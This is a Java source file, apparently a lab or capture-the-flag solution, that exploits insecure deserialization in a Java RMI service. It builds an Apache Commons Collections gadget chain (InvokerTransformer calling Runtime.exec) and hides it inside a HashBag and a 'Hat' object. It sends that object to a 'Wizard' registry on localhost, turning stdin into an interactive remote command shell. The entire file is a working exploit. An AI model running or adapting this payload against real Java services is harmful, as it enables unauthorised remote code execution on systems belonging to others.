package ch.scrt;

import java.net.InetAddress;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.Scanner;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.HashBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mockito.internal.util.reflection.Whitebox;

import ch.scrt.model.Hat;

public class MyExploit {
	public static void main(String[] args) throws Exception {
		System.setProperty(
				"org.apache.commons.collections.enableUnsafeSerialization",
				"true");
		Registry registry = LocateRegistry.getRegistry(
				InetAddress.getByName("localhost").getHostName(),
				2020);
        WizardAPI wizard = (WizardAPI)registry.lookup("Wizard");
        Scanner in = new Scanner(System.in);
        while(true) {
        		System.out.print("$ ");
        		String command = in.nextLine();
        		try {
        			System.out.println(wizard.castASpell(generatePayload(command)));
        		} catch (Exception e) {
        			System.out.println("Exception: " + e);
        		}
        }
	}
	@SuppressWarnings("rawtypes")
	public static Hat generatePayload(String command) throws Exception {
		/* Transformer for Runtime.getRuntime().exec(command) */
		String[] execArgs = new String[]{command};
		Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod",
						new Class[] { String.class, Class[].class },
						new Object[] {"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke",
						new Class[] { Object.class, Object[].class },
						new Object[] { null, new Object[0] }),
				new InvokerTransformer("exec",
						new Class[] { String.class },
						new String[] { command }),
				new ConstantTransformer(1)
		};
		/* Chaining all these */
		Transformer chainedTransformer = new ChainedTransformer(transformers);
		Map map = new HashMap();
		Map lazyMap = LazyMap.decorate(map, chainedTransformer);
		
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
		HashBag bagWithExploit = new HashBag();
		bagWithExploit.add(new Object());

		Map internalMap = (Map) Whitebox.getInternalState(bagWithExploit, "map");
		Object[] nodesArray = (Object[]) Whitebox.getInternalState(internalMap, "table");
		Object node = Arrays.stream(nodesArray)
				.filter(Objects::nonNull)
				.findFirst()
				.orElseThrow(() -> new RuntimeException("this can't happen"));
		Whitebox.setInternalState(node, "key", entry);

		Hat hat = new Hat();
		Whitebox.setInternalState(hat, "content", bagWithExploit);
		return hat;
	}
}
